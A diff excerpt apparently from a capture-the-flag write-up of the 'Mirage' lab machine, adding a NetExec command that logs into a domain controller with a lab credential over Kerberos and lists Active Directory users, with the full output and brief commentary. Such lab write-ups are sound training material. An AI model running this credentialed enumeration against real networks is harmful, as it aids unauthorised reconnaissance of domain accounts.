@@ -479,7 +479,25 @@ svc_mirage
 
 Ill use `--rid-brute` to get users, this also pulls machine accounts so in my personal opinion it works better than `--users` or `--users-export`
 
+```python
+❯❯❯ faketime -f +7h nxc smb dc01.mirage.htb -u 'nathan.aadam' -p '3edc#EDC3' -k --users
+SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\nathan.aadam:3edc#EDC3 
+SMB         dc01.mirage.htb 445    dc01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
+SMB         dc01.mirage.htb 445    dc01             Administrator                 2025-06-23 21:18:18 0       Built-in account for administering the computer/domain 
+SMB         dc01.mirage.htb 445    dc01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
+SMB         dc01.mirage.htb 445    dc01             krbtgt                        2025-05-01 07:42:23 0       Key Distribution Center Service Account 
+SMB         dc01.mirage.htb 445    dc01             Dev_Account_A                 2025-05-27 14:05:12 0        
+SMB         dc01.mirage.htb 445    dc01             Dev_Account_B                 2025-05-02 08:28:11 0        
+SMB         dc01.mirage.htb 445    dc01             david.jjackson                2025-05-02 08:29:50 0        
+SMB         dc01.mirage.htb 445    dc01             javier.mmarshall              2025-05-25 18:44:43 0       Contoso Contractors 
+SMB         dc01.mirage.htb 445    dc01             mark.bbond                    2025-06-23 21:18:18 0        
+SMB         dc01.mirage.htb 445    dc01             nathan.aadam                  2025-06-23 21:18:18 0        
+SMB         dc01.mirage.htb 445    dc01             svc_mirage                    2025-05-22 20:37:45 0       Old service account migrated by contractors 
+SMB         dc01.mirage.htb 445    dc01             [*] Enumerated 10 local users: MIRAGE
+```
 
+I also however think it is always worth running `--users` since it also gets user account descriptions, which 
 
 
 
